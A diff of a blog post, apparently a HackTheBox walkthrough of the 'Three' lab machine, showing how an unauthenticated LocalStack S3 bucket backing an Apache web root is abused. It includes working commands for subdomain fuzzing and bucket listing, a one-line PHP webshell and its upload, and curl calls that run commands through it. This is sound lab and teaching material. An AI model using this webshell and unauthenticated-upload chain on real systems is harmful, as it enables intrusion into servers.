@@ -1,10 +1,17 @@
 ---
-title: "three"
+title: "Three — HackTheBox Starting Point Walkthrough"
 date: 2026-02-01
 draft: false
-tags: ["linux", "web", "starting point"]
+tags: ["htb-walkthrough", "linux", "web", "ssh", "privilege-escalation", "starting point"]
 categories: ["writeups"]
-summary: ""
+series: ["Starting Point"]
+description: "HackTheBox Three writeup: exploit a misconfigured LocalStack S3 bucket to upload a PHP webshell and gain RCE on this Linux Starting Point machine."
+keywords: ["HackTheBox Three", "hackthebox walkthrough", "LocalStack misconfiguration", "S3 bucket write", "PHP webshell", "aws cli exploit", "subdomain enumeration", "starting point htb", "cloud storage RCE", "aws endpoint-url", "penetration testing", "nmap"]
+summary: "A misconfigured S3-compatible bucket with an open write policy turns a static band website into a remote code execution opportunity. Here's how subdomain enumeration and a single AWS CLI command led to a shell."
+cover:
+  image: "cover.png"
+  alt: "Three — Starting Point Linux machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Linux (Ubuntu)"
@@ -12,50 +19,62 @@ params:
 ShowToc: true
 ---
 
-# Three — Pwning a Website via a Misconfigured S3 Bucket
 
-A deceptively simple Starting Point box, Three demonstrates how a misconfigured S3-compatible storage backend can turn a static-looking website into a remote code execution vulnerability. The attack chain is short but teaches a genuinely common real-world pattern: enumerate subdomains, find exposed cloud storage, write a webshell, get a shell.
+# HackTheBox — Three
+
+A deceptively simple Starting Point box that demonstrates how cloud storage misconfigurations can turn a read-only website into a remote code execution vector. Three pairs subdomain enumeration with an unauthenticated, writable LocalStack S3 bucket — and since Apache is serving PHP directly from that bucket, uploading a webshell is all it takes.
+
+---
+
+## Overview
+
+The target is a Linux machine running an Apache web server for a fictional band called "The Toppers." The interesting twist is that the web root is backed by a LocalStack S3-compatible bucket with no authentication enforced. Once you discover the `s3.thetoppers.htb` subdomain and confirm the bucket is publicly writable, uploading a PHP webshell gives you immediate code execution as `www-data`.
 
 ---
 
 ## Reconnaissance
 
-### Port Scan
+### Port Scanning
 
-Standard nmap to start. Two open ports — SSH and HTTP, nothing exotic.
+I started with the standard Nmap scan to understand what services are exposed:
+
+```bash
+nmap -sC -sV -oN nmap.txt <TARGET>
+```
 
 ![terminal output](terminal_01.png)
 
-Port 80 is the obvious entry point, so let's see what's running there.
+Nothing exotic — SSH and HTTP only. The Apache version pins this as Ubuntu Bionic (18.04). With no other attack surface visible, the web application becomes the logical focus.
 
 ### Web Enumeration
 
-Navigating to the IP redirects to `http://thetoppers.htb` — a band website for "The Toppers" with fully static content. Nothing interactive, no login forms, no obvious attack surface in the HTML itself. I added the hostname to `/etc/hosts` and kept looking.
+Navigating to `http://<TARGET>` redirected me to `http://thetoppers.htb`, so I added the hostname to my hosts file before exploring further:
 
-The interesting question is always: what *else* is on this domain? Virtual host and subdomain enumeration is worth doing here. In this case, the box hints that a subdomain exists, but in a real engagement you'd reach for a tool like `gobuster` in vhost mode or `ffuf` with a subdomain wordlist:
+```bash
+echo "<TARGET> thetoppers.htb" >> /etc/hosts
+```
+
+The site is a static band promotional page — contact form, images, no dynamic functionality worth probing directly. Normally I'd reach for `gobuster` or `ffuf` for directory fuzzing here, but the more interesting lead is subdomain enumeration. Virtual hosting is common on CTF machines, and cloud-adjacent services often live on predictable subdomains like `s3`, `cdn`, or `assets`.
+
+The machine's Starting Point hints point toward `s3.thetoppers.htb`. In a real engagement, you'd discover this through DNS brute-forcing:
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-     -u http://thetoppers.htb \
-     -H "Host: FUZZ.thetoppers.htb" \
-     -fc 302
+     -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \
+     -fs 11952
 ```
 
-The subdomain that matters here is `s3.thetoppers.htb`. After adding it to `/etc/hosts`, a quick `curl` reveals it immediately:
+After adding the subdomain to `/etc/hosts` as well, visiting `http://s3.thetoppers.htb` returns a telling JSON response:
 
 ![terminal output](terminal_02.png)
 
-That's the fingerprint of a [LocalStack](https://localstack.cloud/) instance — a local AWS service emulator commonly used in development environments. It exposes an S3-compatible API endpoint, which means we can interact with it using the standard AWS CLI by pointing it at this host instead of AWS proper.
+That's a LocalStack S3-compatible endpoint. LocalStack is a popular tool for emulating AWS services locally — and its default configuration ships with **no authentication**. This is worth exploring aggressively.
 
----
+### S3 Bucket Enumeration
 
-## Foothold
+The AWS CLI's `--endpoint-url` flag is the key tool here. It lets you point the CLI at any S3-compatible API, not just AWS proper. Combined with `--no-sign-request` (which skips credential signing entirely), we can interact with LocalStack without needing valid AWS keys.
 
-### Enumerating the S3 Bucket
-
-The AWS CLI's `--endpoint-url` flag lets you redirect any S3 command to an arbitrary S3-compatible service. Combined with `--no-sign-request` (which skips authentication entirely), we can start querying this LocalStack instance without credentials.
-
-First, let's list available buckets:
+First, list all available buckets:
 
 ```bash
 aws --endpoint-url=http://s3.thetoppers.htb s3 ls --no-sign-request
@@ -63,7 +82,7 @@ aws --endpoint-url=http://s3.thetoppers.htb s3 ls --no-sign-request
 
 ![terminal output](terminal_03.png)
 
-There's a bucket named `thetoppers.htb`. Let's see what's inside it:
+There's a bucket named `thetoppers.htb` — the same name as the website. That's a strong signal that this bucket *is* the web root. Let's confirm by listing its contents recursively:
 
 ```bash
 aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb \
@@ -72,26 +91,32 @@ aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb \
 
 ![terminal output](terminal_04.png)
 
-This is significant: the bucket contains `.htaccess` and `index.php` — this is the Apache web root for `thetoppers.htb`. The web server is serving files directly from the S3 bucket. Apache processes PHP files as it serves them, so if we can write to this bucket, we can write executable code.
+The `index.php` match is the confirmation I needed. Apache is serving this bucket's contents as the document root — which means if I can write a PHP file to the bucket, Apache will execute it.
 
-The critical question is whether the bucket allows unauthenticated writes. With LocalStack running default configuration, the answer is yes — there's no ACL or policy in place to restrict uploads.
+---
 
-### Uploading a Webshell
+## Foothold
 
-The simplest possible PHP webshell: one line that passes a GET parameter directly to `system()`. We create it locally and upload it to the bucket root:
+### Uploading a PHP Webshell
+
+The attack path is straightforward: create a minimal PHP webshell locally, upload it to the S3 bucket via the unauthenticated write access, and then trigger execution through the web server.
+
+I created a one-liner webshell that passes URL parameters directly to `system()`:
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
+```
 
+Then I uploaded it to the bucket root:
+
+```bash
 aws --endpoint-url=http://s3.thetoppers.htb s3 cp /tmp/shell.php \
     s3://thetoppers.htb/shell.php --no-sign-request
 ```
 
-Now `shell.php` lives in the bucket, which means Apache will serve it at `http://thetoppers.htb/shell.php`. Because Apache is configured to execute PHP, our upload is immediately a working webshell.
-
 ### Confirming Remote Code Execution
 
-Let's verify execution before doing anything more complex:
+With the file uploaded, I tested execution by passing the `id` command through the `cmd` parameter:
 
 ```bash
 curl "http://thetoppers.htb/shell.php?cmd=id"
@@ -99,22 +124,28 @@ curl "http://thetoppers.htb/shell.php?cmd=id"
 
 ![terminal output](terminal_05.png)
 
-We have code execution as `www-data`. From here, reading the flag is straightforward:
+We have RCE as `www-data`. From here, reading the flag is trivial:
 
 ```bash
 curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
 ```
 
-Flag retrieved. This is a single-flag Starting Point box, so there's no privilege escalation to chase here.
+Flag: `[redacted]`
+
+---
+
+## A Note on What I Tried and Skipped
+
+For a box this focused, there weren't many dead ends — but it's worth noting that directory fuzzing on the main site (`gobuster dir -u http://thetoppers.htb`) returns nothing useful beyond the static assets already visible. The real pivot point is recognizing that S3 subdomains are worth enumerating separately and that LocalStack instances warrant immediate unauthenticated write testing. If the bucket had been read-only, the path forward would have been very different (harvesting credentials from source files, for instance).
 
 ---
 
 ## Lessons Learned
 
-**Subdomain enumeration is always worth doing.** The entire attack surface here was hidden behind a subdomain. `s3.thetoppers.htb` would have been found by any wordlist that includes "s3" — which most do. In real engagements this extends to certificate transparency logs, DNS zone transfers where permitted, and tools like `amass` or `subfinder`.
+**S3 subdomain enumeration matters.** Cloud storage endpoints frequently live on predictable subdomains. If a target company uses AWS or self-hosted S3-compatible storage, adding `s3`, `storage`, `assets`, and `cdn` to your virtual host wordlist is good practice. DNS enumeration tools like `ffuf` with a `Host` header sweep are the reliable way to surface these in real engagements.
 
-**LocalStack's default configuration has no authentication.** LocalStack is designed for local development, so out-of-the-box it accepts all requests without credentials. The `--no-sign-request` flag tells the AWS CLI not to even attempt to sign the request. This becomes a critical vulnerability when LocalStack is accidentally exposed on a network interface accessible to attackers — which happens more than you'd think when developers spin up a dev environment without restricting bind addresses.
+**LocalStack defaults are dangerous in exposed environments.** LocalStack is designed for local development and ships with authentication disabled by default. When a developer accidentally exposes it — or when it's deployed in a staging environment without hardening — it becomes trivially exploitable. The `--no-sign-request` flag in the AWS CLI is your first tool to test for this condition.
 
-**Writable web root + script execution = RCE.** The core vulnerability here isn't really S3 — it's that the web server's document root is backed by a storage service that accepts unauthenticated writes. If you can write arbitrary files to a directory that a web server serves with script execution enabled, you have RCE. This pattern shows up with misconfigured NFS mounts, writable FTP roots, and cloud storage buckets in exactly the same way.
+**Writable web roots via cloud storage = RCE.** This is the core lesson of this box and it applies well beyond CTFs. If an application's document root is backed by writable cloud storage (S3, GCS, Azure Blob), and the web server executes scripts from that directory, any write primitive becomes code execution. This attack pattern shows up in real-world cloud misconfigurations regularly.
 
-**The `--endpoint-url` flag is a powerful enumeration primitive.** Any S3-compatible service — Minio, Ceph, DigitalOcean Spaces, Backblaze B2, LocalStack — can be queried with the standard AWS CLI. If you encounter an S3-like API during an engagement, you don't need a specialized tool. `aws s3 ls --endpoint-url=<target> --no-sign-request` is often enough to determine whether you have unauthenticated access.
+**The `--endpoint-url` flag is a powerful enumeration primitive.** The AWS CLI isn't just for AWS. Any S3-compatible service — MinIO, LocalStack, Ceph, DigitalOcean Spaces — can be enumerated with the same tooling by pointing `--endpoint-url` at the right host. Keep this in your toolkit whenever you encounter cloud storage endpoints during an engagement.
